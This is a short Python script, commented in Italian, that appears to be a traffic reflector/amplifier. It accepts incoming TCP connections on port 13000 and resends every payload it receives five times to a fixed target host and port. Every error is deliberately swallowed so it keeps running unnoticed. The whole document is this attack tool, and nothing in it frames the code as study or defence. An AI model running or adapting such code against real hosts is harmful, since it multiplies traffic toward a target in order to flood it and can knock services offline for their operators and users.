#!/usr/bin/env python3
import socket
import threading

# Configurazione
LISTEN_HOST = "0.0.0.0"          # Ascolta su tutte le interfacce
LISTEN_PORT = 13000              # Porta per ricevere il traffico in ingresso
TARGET_IP = "192.168.1.100"      # IP verso cui inoltrare (riflettere) il traffico
TARGET_PORT = 80               # Porta target
AMPLIFICATION_FACTOR = 5         # Numero di volte in cui reinviare il payload

def handle_connection(conn, addr):
    try:
        while True:
            data = conn.recv(4096)
            if not data:
                break  # La connessione è stata chiusa dal mittente
            # Inoltra (amplifica) il payload al target
            for _ in range(AMPLIFICATION_FACTOR):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((TARGET_IP, TARGET_PORT))
                    s.sendall(data)
                    s.close()
                except Exception:
                    pass  # Gli errori vengono silenziati
    except Exception:
        pass
    finally:
        conn.close()

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((LISTEN_HOST, LISTEN_PORT))
    s.listen(10)
    # Ciclo infinito per accettare connessioni
    while True:
        try:
            conn, addr = s.accept()
            threading.Thread(target=handle_connection, args=(conn, addr), daemon=True).start()
        except Exception:
            continue

if __name__ == "__main__":
    main()

